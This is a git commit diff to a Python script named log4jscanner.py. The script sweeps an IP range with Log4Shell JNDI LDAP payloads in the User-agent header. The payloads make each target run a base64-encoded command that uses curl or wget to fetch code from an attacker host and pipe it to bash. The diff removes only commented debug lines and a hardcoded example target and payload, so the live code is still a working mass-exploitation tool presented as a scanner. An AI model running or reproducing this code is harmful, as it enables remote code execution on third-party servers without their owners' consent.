0d467c2248991725c9212219e3bdc6ff216ba231
Rajdeep Singh <singh.rajdeep369@gmail.com>
2021-12-14 19:09:14 +0530

    Update log4jscanner.py

--- log4jscanner.py
+++ log4jscanner.py
@@ -11,13 +11,11 @@ for i in range(1,256):
 		url='https://'+iprange+str(i)+'/'
 		b64str = '(curl -s '+revip+':8888/'+iprange+str(i)+':443||wget -q -O- '+revip+':8888/'+iprange+str(i)+':443)|bash'
 		b64strenc = base64.b64encode(b64str.encode('ascii')).decode('ascii').strip('=')
-#	print(b64str)
-#	print(b64strenc)
+
+		
 		header = {'User-agent': '${jndi:ldap://'+revip+':8888/Basic/Command/Base64/'+b64strenc+'}','Host': iprange+str(i)+':443','Connection': 'Close','Accept-Encoding': 'gzip'}
 		header2 = {'User-agent': '${jndi:ldap://'+revip+':8888/a','Host': '+iprange+'+str(i)+':443','Connection': 'Close','Accept-Encoding': 'gzip'}
-#	print(header)
-#url="https://175.100.162.55/"
-#header = {'User-agent': '${jndi:ldap://7.7.7.7:12344/Basic/Command/Base64/KGN1cmwgLXMgNy43LjcuNzo1ODc0LzE3NS4xMDAuMTYyLjU1OjQ0M3x8d2dldCAtcSAtTy0gNy43LjcuNzo1ODc0LzE3NS4xMDAuMTYyLjU1OjQ0Myl8YmFzaA}','Host': '175.100.162.55:443','Connection': 'Close','Accept-Encoding': 'gzip'}
+
 		response  = requests.get(url, headers = header, verify=False)
 		print(iprange+str(i)+"  P1   "+str(response.status_code))
 		response  = requests.get(url, headers = header2, verify=False)
